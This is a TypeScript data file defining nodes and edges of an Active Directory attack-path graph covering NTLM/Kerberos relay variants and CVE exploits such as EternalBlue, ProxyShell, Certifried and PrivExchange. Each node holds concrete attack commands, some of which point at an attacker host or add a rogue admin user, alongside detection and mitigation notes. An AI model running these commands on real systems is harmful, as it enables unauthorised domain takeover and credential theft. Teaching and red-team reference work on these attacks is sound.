import type { AttackEdge, TechniqueNodeDef } from '../schema';

const r = String.raw;
const mitre = (id: string): { id: string; url: string } => ({
  id,
  url: `https://attack.mitre.org/techniques/${id.replace('.', '/')}/`,
});

/**
 * Web-verified additions (June 2026):
 *   - NTLM-relay variants hanging off the existing `ntlm-relay` node.
 *   - "Quick-compromise" CVE PoCs hanging off a new `ad-cat-quick-compromise`
 *     category node.
 * Every command/flag/CVE/MITRE mapping below was checked against MITRE ATT&CK,
 * the official tool repos (Impacket, krbrelayx/PrivExchange by dirkjanm,
 * KrbRelayUp, Certipy), thehacker.recipes, HackTricks and Microsoft advisories.
 * Several of these are destructive or CVE PoCs: see each node's `opsec`.
 */
export const ntlmRelayCveNodes: TechniqueNodeDef[] = [
  // ── GROUP 1: NTLM-relay variants (parent = ntlm-relay) ──────────────────
  {
    id: 'relay-drop-mic',
    label: 'Drop-the-MIC (CVE-2019-1040)',
    phase: 'credential-access',
    summary: 'Strip the NTLM MIC to relay cross-protocol (SMB -> LDAP).',
    description:
      'The Message Integrity Code (MIC) is meant to stop attackers from tampering with NTLM messages while relaying them. CVE-2019-1040 ("Drop the MIC") showed the server accepts the authentication even when the MIC is removed despite the flag claiming its presence, letting an attacker clear the session-signing negotiation flags. ntlmrelayx implements this with --remove-mic, enabling cross-protocol unsigning relays such as SMB to LDAP. Relaying a machine/user to LDAP this way lets you grant DCSync rights (WriteDacl on the domain) or configure delegation.',
    tools: [
      { name: 'ntlmrelayx (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      {
        label: 'Relay SMB to LDAP with the MIC stripped, escalate a user',
        code: r`ntlmrelayx.py -t ldap://dc01 --remove-mic --escalate-user lowpriv -smb2support`,
        lang: 'bash',
      },
      {
        label: 'Relay to LDAPS (also works when NTLMv1 is allowed)',
        code: r`ntlmrelayx.py -t ldaps://dc01 --remove-mic -i -smb2support`,
        lang: 'bash',
      },
    ],
    requires: [
      'Captured/coerced NTLM authentication to relay',
      'A DC unpatched for CVE-2019-1040 (pre June-2019)',
      'LDAP signing / channel binding NOT enforced on the target',
    ],
    mitre: mitre('T1557.001'),
    references: [
      { label: 'dirkjanm, Exploiting CVE-2019-1040', url: 'https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/' },
      { label: 'The Hacker Recipes, NTLM relay', url: 'https://www.thehacker.recipes/ad/movement/ntlm/relay' },
    ],
    opsec: 'CVE PoC: only works against DCs unpatched for CVE-2019-1040, and the LDAP-side ACL/escalation change (DCSync grant, 5136 directory-modification) is high-signal and persistent. Enforcing LDAP signing + channel binding mitigates the relay entirely.',
    difficulty: 'hard',
  },
  {
    id: 'relay-to-mssql',
    label: 'Relay to MSSQL',
    phase: 'credential-access',
    summary: 'Relay auth to a SQL Server, run xp_cmdshell as the login.',
    description:
      'Instead of relaying to SMB/LDAP, point ntlmrelayx at a MSSQL instance with -t mssql://. The relayed identity is authenticated to the database; if that login is sysadmin (or can enable it) you can turn on and run xp_cmdshell to execute OS commands as the SQL Server service account. ntlmrelayx exposes an interactive MSSQL prompt with -i (a SOCKS proxy via -socks is the multi-target alternative).',
    tools: [
      { name: 'ntlmrelayx (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      {
        label: 'Relay to MSSQL, open an interactive SQL shell',
        code: r`ntlmrelayx.py -t mssql://10.0.0.30 -i -smb2support --no-multirelay`,
        lang: 'bash',
      },
      {
        label: 'In the relayed SQL prompt: enable + run xp_cmdshell',
        code: r`enable_xp_cmdshell` + '\n' + r`xp_cmdshell whoami`,
        lang: 'sql',
      },
    ],
    requires: [
      'Captured/coerced authentication of a SQL login',
      'A reachable MSSQL instance where the relayed login is (or can become) sysadmin',
    ],
    mitre: mitre('T1557.001'),
    references: [
      { label: 'HackTricks, Pentesting MSSQL', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html' },
      { label: 'Compass Security, Relaying NTLM to MSSQL', url: 'https://blog.compass-security.com/2023/10/relaying-ntlm-to-mssql/' },
    ],
    opsec: 'xp_cmdshell execution and the sp_configure change are logged by SQL Server audit/EDR and the spawned cmd runs as the SQL service account. Disabling xp_cmdshell and enforcing Extended Protection on SQL endpoints closes this path.',
    difficulty: 'medium',
  },
  {
    id: 'relay-to-wsus',
    label: 'Relay / Abuse WSUS',
    phase: 'credential-access',
    summary: 'Relay WSUS client auth, or push a malicious update.',
    description:
      'WSUS clients authenticate to the update server, so an attacker spoofing/relaying WSUS (commonly over the cleartext HTTP port 8530) can capture and relay machine and user authentications to SMB, LDAP/S or AD CS (ESC8). A separate, more invasive angle is update weaponization: when WSUS runs over HTTP, a MITM can inject a signed-but-attacker-chosen Microsoft-signed binary (e.g. PsExec) as a "patch", running as SYSTEM on the client. Note the relay and the update-injection are distinct attacks with different tooling.',
    tools: [
      { name: 'ntlmrelayx (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'PyWSUS', url: 'https://github.com/GoSecure/pywsus' },
      { name: 'wsuks', url: 'https://github.com/NeffIsBack/wsuks' },
      { name: 'WSUSpendu', url: 'https://github.com/GoSecure/pywsus' },
    ],
    commands: [
      {
        label: 'Relay WSUS client auth (listen on the WSUS HTTP port)',
        code: r`ntlmrelayx.py -t ldaps://dc01 -smb2support --http-port 8530 --remove-mic --escalate-user lowpriv`,
        lang: 'bash',
      },
      {
        label: 'Inject a malicious "update" via a rogue HTTP WSUS server',
        code: r`python pywsus.py -H <attacker_ip> -p 8530 -c 'cmd.exe' -e '/c net user hacker Passw0rd! /add'`,
        lang: 'bash',
      },
    ],
    requires: [
      'A position to intercept/relay WSUS traffic (LLMNR/ARP/mitm6 poisoning or rogue server)',
      'WSUS configured over HTTP (no TLS) for the update-injection variant',
    ],
    mitre: mitre('T1557.001'),
    references: [
      { label: 'TrustedSec, WSUS Is SUS: NTLM Relay Attacks', url: 'https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight' },
      { label: 'GoSecure, Abusing WSUS to enable NTLM relaying', url: 'https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks/' },
    ],
    opsec: 'Destructive/disruptive: serving a fake update deploys a binary to clients as SYSTEM and shows up as an out-of-band patch in WSUS reporting; the MITM/poisoning leg is itself noisy. Configuring WSUS over HTTPS with TLS mitigates the update-injection variant. (PyWSUS command is illustrative: confirm flags against the tool README for your version.)',
    difficulty: 'hard',
  },
  {
    id: 'kerberos-relay',
    label: 'Kerberos Relay',
    phase: 'credential-access',
    summary: 'Relay a Kerberos AP-REQ (e.g. to LDAP) for RBCD.',
    description:
      'Kerberos auth can also be relayed: an AP-REQ initiated by a victim for one service is forwarded to another service that does not enforce signing/encryption. dirkjanm\'s krbrelayx (paired with mitm6 to coerce auth via DNS) relays the ticket (supported targets are HTTP and LDAP) while KrbRelayUp packages a local self-relay on Windows where LDAP signing is not enforced (the default), coercing the local machine account, relaying to LDAP, and configuring RBCD over the host to gain SYSTEM. Note: relaying to LDAP is often hard by default because of channel binding/signing, so AD CS (HTTP) is a common alternative target.',
    tools: [
      { name: 'krbrelayx (dirkjanm)', url: 'https://github.com/dirkjanm/krbrelayx' },
      { name: 'KrbRelayUp', url: 'https://github.com/Dec0ne/KrbRelayUp' },
      { name: 'mitm6', url: 'https://github.com/dirkjanm/mitm6' },
    ],
    commands: [
      {
        label: 'krbrelayx: relay a coerced Kerberos AP-REQ to AD CS over HTTP',
        code: r`krbrelayx.py --target http://adcs.domain.local/certsrv/ -ip <attacker_ip> --victim TARGET$ --adcs --template Machine`,
        lang: 'bash',
      },
      {
        label: 'KrbRelayUp: RBCD local privesc (relay then spawn)',
        code: r`KrbRelayUp.exe relay -d domain.local -cn FAKECOMPUTER -m rbcd -cls 90f18417-f0f1-484e-9d3c-59dceee5dbd8` + '\n' + r`KrbRelayUp.exe spawn -d domain.local -cn FAKECOMPUTER -m rbcd -cp Passw0rd! -i Administrator`,
        lang: 'powershell',
      },
    ],
    requires: [
      'Ability to coerce/trigger Kerberos auth from the victim (mitm6/DNS, local COM)',
      'A target service not enforcing Kerberos signing/encryption (HTTP AD CS, or LDAP without signing)',
      'MachineAccountQuota > 0 (to create the RBCD computer object)',
    ],
    mitre: mitre('T1557.001'),
    references: [
      { label: 'HackTricks, LDAP Signing & Channel Binding (Kerberos relay)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ldap-signing-and-channel-binding.html' },
      { label: 'The Hacker Recipes, Kerberos relay', url: 'https://www.thehacker.recipes/ad/movement/kerberos/relay' },
      { label: 'dirkjanm, Relaying Kerberos over DNS with krbrelayx & mitm6', url: 'https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/' },
      { label: 'Microsoft, Detecting KrbRelayUp', url: 'https://www.microsoft.com/en-us/security/blog/2022/05/25/detecting-and-preventing-privilege-escalation-attacks-leveraging-kerberos-relaying-krbrelayup/' },
    ],
    opsec: 'Creating/renaming a machine account (4741/4781) and the RBCD attribute write (5136 on msDS-AllowedToActOnBehalfOfOtherIdentity) are detectable; mitm6/DNS poisoning is noisy. Enforcing LDAP signing + channel binding and setting MachineAccountQuota to 0 break the chain.',
    difficulty: 'hard',
  },
  {
    id: 'relay-to-ldap',
    label: 'Relay to LDAP(S)',
    phase: 'lateral-movement',
    summary: 'Relay the captured NTLM auth to a DC over LDAP(S) for a directory write.',
    description: r`Relay the coerced/poisoned NTLM authentication to LDAP or LDAPS on a Domain Controller. Plain LDAP requires signing, so LDAPS is the usual target (viable when channel binding is not enforced). The relayed session acts as the victim in the directory, so ntlmrelayx can perform a write attack: configure Resource-Based Constrained Delegation on a computer object (auto-creating an attacker-controlled computer with --delegate-access) or add Shadow Credentials (--shadow-credentials) to a principal. A relayed machine account is ideal because it can write over its own object.`,
    tools: [
      { name: 'Impacket ntlmrelayx', url: 'https://github.com/fortra/impacket' },
      { name: 'krbrelayx', url: 'https://github.com/dirkjanm/krbrelayx' },
    ],
    commands: [
      { label: 'Relay to LDAPS -> configure RBCD', code: r`ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access -smb2support`, lang: 'bash' },
      { label: 'Relay to LDAPS -> Shadow Credentials', code: r`ntlmrelayx.py -t ldaps://dc01.corp.local --shadow-credentials -smb2support`, lang: 'bash' },
    ],
    mitre: mitre('T1557.001'),
    references: [
      { label: 'HackTricks, LDAP Signing & Channel Binding', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ldap-signing-and-channel-binding.html' },{ label: 'The Hacker Recipes, NTLM relay', url: 'https://www.thehacker.recipes/ad/movement/ntlm/relay' }],
    requires: ['Captured/coerced NTLM auth (a machine account is ideal)', 'LDAP signing / channel binding NOT enforced on the DC'],
    opsec: 'Writing msDS-AllowedToActOnBehalfOfToOtherIdentity or msDS-KeyCredentialLink is an auditable directory change (5136); --delegate-access also creates a computer account (4741). Enforcing LDAP signing + channel binding breaks this. Clean up the attribute afterwards.',
    difficulty: 'medium',
  },

  // ── GROUP 2: quick-compromise CVEs (parent = ad-cat-quick-compromise) ────
  {
    id: 'ad-cat-quick-compromise',
    label: 'Quick Compromise',
    phase: 'initial-access',
    kind: 'category',
    summary: 'Unauthenticated RCE straight to SYSTEM / DA.',
    description:
      'Pre-auth, high-impact exploits against exposed services that can hand you SYSTEM on a host or Domain Admin outright when a target is unpatched: EternalBlue, the Exchange ProxyLogon/ProxyShell chains, SMBGhost, and ZeroLogon against a DC.',
  },
  {
    id: 'eternalblue',
    label: 'EternalBlue (MS17-010)',
    phase: 'initial-access',
    summary: 'SMBv1 buffer overflow -> remote code execution as SYSTEM.',
    description:
      'MS17-010 (CVE-2017-0143/0144/...) is a set of flaws in the SMBv1 server where specially crafted packets cause a pool buffer overflow, allowing unauthenticated remote code execution. The NSA-developed exploit (leaked by the Shadow Brokers and used by WannaCry) yields SYSTEM on an unpatched, SMBv1-enabled host. Scan first, then exploit.',
    tools: [
      { name: 'Metasploit (ms17_010_eternalblue)', url: 'https://github.com/rapid7/metasploit-framework' },
      { name: 'AutoBlue-MS17-010', url: 'https://github.com/3ndG4me/AutoBlue-MS17-010' },
    ],
    commands: [
      {
        label: 'Check vulnerability (NetExec)',
        code: r`nxc smb 10.0.0.0/24 -M ms17-010`,
        lang: 'bash',
      },
      {
        label: 'Exploit with Metasploit',
        code: r`msf6 > use exploit/windows/smb/ms17_010_eternalblue` + '\n' + r`msf6 > set RHOSTS 10.0.0.20; run`,
        lang: 'bash',
      },
    ],
    requires: [
      'A reachable host with SMBv1 enabled (445/tcp)',
      'Host unpatched for MS17-010 (pre March-2017)',
    ],
    mitre: mitre('T1210'),
    references: [
      { label: 'Microsoft, MS17-010 bulletin', url: 'https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010' },
      { label: 'CVE-2017-0144 (NVD)', url: 'https://nvd.nist.gov/vuln/detail/cve-2017-0144' },
    ],
    opsec: 'Memory-corruption PoC: can BSOD/crash the target if the kernel grooming fails, a real risk on production hosts. SMBv1 exploit traffic and the resulting SYSTEM-level process are detectable; disabling SMBv1 and patching fully mitigate.',
    difficulty: 'medium',
  },
  {
    id: 'proxyshell',
    label: 'ProxyShell (Exchange)',
    phase: 'initial-access',
    summary: 'Exchange SSRF + privesc + file-write chain -> webshell/RCE.',
    description:
      'ProxyShell chains three on-prem Exchange CVEs: CVE-2021-34473 (Autodiscover SSRF / URL path confusion reaching the backend as the Exchange machine account), CVE-2021-34523 (PowerShell backend privilege escalation via X-Rps-CAT), and CVE-2021-31207 (arbitrary file write via New-MailboxExportRequest). Combined, an unauthenticated attacker exports a mailbox containing an ASPX webshell into a web-accessible directory, then triggers it for RCE as SYSTEM/Exchange.',
    tools: [
      { name: 'Metasploit (exchange_proxyshell_rce)', url: 'https://github.com/rapid7/metasploit-framework' },
    ],
    commands: [
      {
        label: 'Exploit the full chain with Metasploit',
        code: r`msf6 > use exploit/windows/http/exchange_proxyshell_rce` + '\n' + r`msf6 > set RHOSTS mail.corp.local; set EMAIL admin@corp.local; run`,
        lang: 'bash',
      },
    ],
    requires: [
      'A reachable on-prem Exchange server (Autodiscover/OWA exposed)',
      'Exchange unpatched (2013 <= CU23, 2016 <= CU20, 2019 <= CU9; pre KB5001779 + May-2021)',
    ],
    mitre: mitre('T1190'),
    references: [
      { label: 'Mandiant, PST, Want a Shell? (ProxyShell)', url: 'https://cloud.google.com/blog/topics/threat-intelligence/pst-want-shell-proxyshell-exploiting-microsoft-exchange-servers' },
      { label: 'Qualys, ProxyShell CVE-2021-34473/34523/31207', url: 'https://threatprotect.qualys.com/2021/08/10/proxyshell-a-new-attack-surface-on-microsoft-exchange-server-cve-2021-34473-cve-2021-34523-cve-2021-31207/' },
    ],
    opsec: 'Drops an ASPX webshell on disk (a durable, easily-hunted artifact in Exchange web dirs) and leaves IIS/Exchange request logs of the Autodiscover SSRF and New-MailboxExportRequest. Patch Exchange and monitor for unexpected mailbox export requests.',
    difficulty: 'medium',
  },
  {
    id: 'ms14-068',
    label: 'MS14-068 (CVE-2014-6324)',
    phase: 'priv-esc',
    summary: 'Forge a PAC with elevated group SIDs via the checksum flaw.',
    description:
      'Pre-patch, the KDC validated the PAC signature with KdcVerifyPacSignature accepting any signature <= 20 bytes, so a non-keyed hash (MD5) was accepted as valid. A low-priv user can therefore forge a PAC claiming membership in Domain Admins and have the KDC issue a TGT honoring it. Unlike a Golden Ticket it does not need the krbtgt hash: only a domain account name, its password/hash, and its SID.',
    tools: [
      { name: 'goldenPac (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'pykek (ms14-068.py)', url: 'https://github.com/fortra/impacket/blob/master/examples/goldenPac.py' },
    ],
    commands: [
      {
        label: 'Automated: forge PAC + psexec a privileged session',
        code: r`goldenPac.py domain.local/user:'Passw0rd!'@dc01.domain.local`,
        lang: 'bash',
      },
      {
        label: 'pykek: generate a forged TGT (ccache)',
        code: r`ms14-068.py -u user@domain.local -p Passw0rd! -s S-1-5-21-...-1106 -d dc01.domain.local`,
        lang: 'bash',
      },
    ],
    requires: [
      'Any valid domain account (name, password/hash, and SID)',
      'A DC unpatched for MS14-068 (pre Nov-2014)',
    ],
    mitre: mitre('T1068'),
    references: [
      { label: 'Microsoft, MS14-068 bulletin', url: 'https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-068' },
      { label: 'The Hacker Recipes, MS14-068', url: 'https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/ms14-068' },
    ],
    opsec: 'CVE PoC, only against DCs unpatched since 2014 (rare today). The forged-PAC TGT and the privileged logon it enables are anomalous (4768/4769 with mismatched group membership). No mitigation needed beyond the long-available patch.',
    difficulty: 'medium',
  },
  {
    id: 'certifried',
    label: 'Certifried (CVE-2022-26923)',
    phase: 'priv-esc',
    summary: 'Spoof a machine certificate to impersonate a DC.',
    description:
      'AD CS embeds the requesting machine\'s dNSHostName in the issued certificate, and pre-patch that attribute did not need to be unique. A low-priv user with MachineAccountQuota can create a computer account, set its dNSHostName to a Domain Controller\'s, and request a Machine-template certificate, which then authenticates as the DC. PKINIT auth with that cert returns the DC\'s NT hash, enabling DCSync and full domain takeover.',
    tools: [
      { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
    ],
    commands: [
      {
        label: 'Create a computer account spoofing the DC dNSHostName',
        code: r`certipy account create -u user@domain.local -p 'Passw0rd!' -user EVILPC -dns dc01.domain.local`,
        lang: 'bash',
      },
      {
        label: 'Request a Machine cert, then auth to recover the DC NT hash',
        code: r`certipy req -u 'EVILPC$@domain.local' -p 'Passw0rd!' -ca CORP-CA -template Machine` + '\n' + r`certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1`,
        lang: 'bash',
      },
    ],
    requires: [
      'Any valid domain account with MachineAccountQuota > 0',
      'AD CS with an enabled machine-enrollment template (e.g. Machine)',
      'DC unpatched for CVE-2022-26923 (pre May-2022)',
    ],
    mitre: mitre('T1068'),
    references: [
      { label: 'Oliver Lyak (IFCR), Certifried CVE-2022-26923', url: 'https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4' },
      { label: 'HackTheBox, CVE-2022-26923 explained', url: 'https://www.hackthebox.com/blog/cve-2022-26923-certifried-explained' },
    ],
    opsec: 'Machine-account creation (4741) and a certificate request whose dNSHostName collides with a DC are detectable in AD CS / directory logs. The May-2022 patch (and StrongCertificateBindingEnforcement) ties the cert to the account SID, closing the spoof.',
    difficulty: 'medium',
  },
  {
    id: 'privexchange',
    label: 'PrivExchange (CVE-2019-0724)',
    phase: 'priv-esc',
    summary: 'Coerce Exchange to auth -> relay to LDAP for DCSync.',
    description:
      'The Exchange EWS PushSubscription API can be abused to make the Exchange server authenticate (over HTTP) to an attacker-controlled host, the flaw tracked as CVE-2019-0724. Because Exchange (via the Exchange Windows Permissions group) holds WriteDacl on the domain object by default, relaying that high-privileged machine authentication to LDAP lets the attacker grant a controlled user DCSync rights, escalating any mailbox-holding user toward Domain Admin.',
    tools: [
      { name: 'PrivExchange (dirkjanm)', url: 'https://github.com/dirkjanm/PrivExchange' },
      { name: 'ntlmrelayx (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      {
        label: 'Relay Exchange auth to LDAP, grant DCSync to a user',
        code: r`ntlmrelayx.py -t ldap://dc01 --escalate-user lowpriv`,
        lang: 'bash',
      },
      {
        label: 'Trigger the coerced Exchange authentication',
        code: r`python privexchange.py -ah <attacker_ip> exchange.domain.local -u mailboxuser -d domain.local -p 'Passw0rd!'`,
        lang: 'bash',
      },
    ],
    requires: [
      'Any account with a mailbox on the target Exchange server',
      'Exchange holding default WriteDacl on the domain (pre Feb-2019 hardening)',
      'LDAP signing not enforced (relay target)',
    ],
    mitre: mitre('T1068'),
    references: [
      { label: 'dirkjanm, Abusing Exchange: One API call away from Domain Admin', url: 'https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/' },
      { label: 'The Hacker Recipes, PrivExchange', url: 'https://www.thehacker.recipes/ad/movement/ntlm/relay' },
    ],
    opsec: 'The coerced Exchange auth and the resulting DCSync ACL grant (5136 directory modification) are high-signal. Microsoft\'s Feb-2019 update removed Exchange\'s domain WriteDacl; enforcing LDAP signing/channel binding also blocks the relay.',
    difficulty: 'hard',
  },
];

export const ntlmRelayCveEdges: AttackEdge[] = [
  // GROUP 1: parent ntlm-relay -> variants
  { source: 'ntlm-relay', target: 'relay-drop-mic' },
  { source: 'ntlm-relay', target: 'relay-to-mssql' },
  { source: 'ntlm-relay', target: 'relay-to-wsus' },
  // WSUS relay has two paths: serve a malicious update (→ SYSTEM), OR relay the
  // client auth onward to LDAP like any other relay target.
  { source: 'relay-to-wsus', target: 'local-admin-host', label: 'malicious update -> SYSTEM' },
  { source: 'relay-to-wsus', target: 'relay-to-ldap', label: 'relay client auth' },
  { source: 'ntlm-relay', target: 'kerberos-relay' },
  { source: 'ntlm-relay', target: 'relay-to-ldap' },
  { source: 'relay-to-ldap', target: 'rbcd', label: 'set RBCD attribute' },
  { source: 'relay-to-ldap', target: 'shadow-credentials', label: 'add key credential' },
  { source: 'relay-to-ldap', target: 'dcsync', label: 'grant DS-Replication' },
  // GROUP 1: Drop-the-MIC (CVE-2019-1040) strips the MIC to relay cross-protocol
  // to LDAP; the DCSync grant is then one of relay-to-ldap's outcomes above.
  { source: 'relay-drop-mic', target: 'relay-to-ldap', label: 'drop MIC → cross-protocol' },
  { source: 'kerberos-relay', target: 'adcs-esc8', label: 'relay to web enroll' },
  { source: 'relay-to-mssql', target: 'mssql-linked-servers' },
  { source: 'relay-to-mssql', target: 'user-foothold', label: 'xp_cmdshell as the SQL service account' },
  { source: 'kerberos-relay', target: 'rbcd' },

  // GROUP 2: Quick Compromise = UNAUTHENTICATED known-vuln exploits, off
  // network-recon (no creds needed). The authenticated CVEs (ms14-068,
  // certifried, privexchange) moved to the 'Critical CVEs' category under
  // Privilege Escalation (see ad-categories.ts).
  { source: 'network-recon', target: 'ad-cat-quick-compromise' },
  { source: 'ad-cat-quick-compromise', target: 'zerologon' },
  { source: 'ad-cat-quick-compromise', target: 'eternalblue' },
  { source: 'ad-cat-quick-compromise', target: 'proxyshell' },
  // GROUP 2: downstream into existing nodes
  { source: 'eternalblue', target: 'local-admin-host', label: 'SYSTEM' },
  { source: 'proxyshell', target: 'local-admin-host', label: 'webshell -> RCE' },
  // SYSTEM on Exchange → if Exchange Windows Permissions still holds domain WriteDacl
  // (pre-Feb-2019 hardening), the machine account can grant itself DCSync (= PrivExchange).
  { source: 'proxyshell', target: 'dcsync', label: 'Exchange WriteDacl (unmitigated)' },
  { source: 'ms14-068', target: 'domain-admin' },
  { source: 'certifried', target: 'pass-the-certificate', label: 'DC machine cert' },
  { source: 'privexchange', target: 'dcsync', label: 'DCSync rights' },
];
